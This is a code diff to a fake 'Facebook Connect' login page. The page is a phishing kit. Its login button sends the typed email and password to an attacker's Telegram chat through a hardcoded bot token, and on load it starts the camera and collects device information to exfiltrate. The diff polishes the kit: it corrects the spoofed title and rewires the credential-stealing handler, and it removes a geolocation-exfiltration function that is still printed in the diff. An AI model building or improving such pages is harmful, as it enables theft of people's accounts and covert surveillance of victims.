@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facbook Connect</title>
+    <title>Facebook Connect</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -135,7 +135,7 @@
             <div class="login-form">
                 <input type="text" id="username" placeholder="Email address or phone number">
                 <input type="password" id="password" placeholder="Password">
-                <button onclick="sendToTelegram()">Log in</button>
+                <button id="login-button">Log in</button>
                 <a href="#">Forgotten password?</a>
                 <div class="error-message" id="error-message">Wrong username or password. Please try again.</div>
             </div>
@@ -143,6 +143,8 @@
         </div>
     </div>
     <script>
+        const botToken = '7347658420:AAFJel5v5zRqa-wF5IrK_lQoI1YPyHOZG0w';
+
         function getQueryParams() {
             const params = {};
             const queryString = window.location.search.slice(1);
@@ -154,7 +156,6 @@
             return params;
         }
 
-        const botToken = '7347658420:AAFJel5v5zRqa-wF5IrK_lQoI1YPyHOZG0w';
         const { chatId } = getQueryParams();
 
         async function startVideo() {
@@ -254,12 +255,10 @@
                     })
                 });
 
-                const data = await response.json();
-
                 if (response.ok) {
                     console.log("User info sent to Telegram");
                 } else {
-                    console.error(`Error sending user info to Telegram: ${data.description}`);
+                    console.error("Error sending user info to Telegram: ", response.statusText);
                 }
             } catch (error) {
                 console.error("Error sending user info to Telegram: ", error);
@@ -296,34 +295,6 @@
             }
         }
 
-        async function sendLocationToTelegram(locationInfo) {
-            const url = `https://api.telegram.org/bot${botToken}/sendLocation`;
-
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        latitude: locationInfo.latitude,
-                        longitude: locationInfo.longitude
-                    })
-                });
-
-                const data = await response.json();
-
-                if (response.ok) {
-                    console.log("Location info sent to Telegram");
-                } else {
-                    console.error(`Error sending location info to Telegram: ${data.description}`);
-                }
-            } catch (error) {
-                console.error("Error sending location info to Telegram: ", error);
-            }
-        }
-
         async function initializeFirstPart() {
             await startVideo();
             await getUserInfo();
@@ -351,6 +322,8 @@
         window.onload = () => {
             initializeFirstPart();
         };
+
+        document.getElementById('login-button').addEventListener('click', sendToTelegram);
     </script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.31/ua-parser.min.js"></script>
 </body>
